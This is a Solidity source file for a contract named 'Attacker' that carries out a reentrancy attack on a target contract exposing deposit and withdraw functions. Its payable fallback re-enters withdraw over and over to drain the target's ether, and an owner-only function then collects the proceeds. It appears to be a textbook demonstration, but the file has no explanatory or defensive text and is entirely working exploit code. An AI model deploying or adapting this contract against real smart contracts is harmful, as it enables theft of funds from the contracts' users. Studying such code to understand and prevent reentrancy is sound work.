// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IVulnerable {
    function deposit() external payable;
    function withdraw(uint256 _amount) external;
}

contract Attacker {
    IVulnerable public vulnerable;
    address public owner;

    constructor(address _vulnerableAddress) {
        vulnerable = IVulnerable(_vulnerableAddress);
        owner = msg.sender;
    }

    // fallback function which gets called when the contract receives ether
    fallback() external payable {
        if (address(vulnerable).balance >= 1 ether) {
            vulnerable.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.sender == owner, "Not owner");
        require(msg.value >= 1 ether, "Insufficient ether");
        vulnerable.deposit{value: 1 ether}();
        vulnerable.withdraw(1 ether);

    }

    function collectEther() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}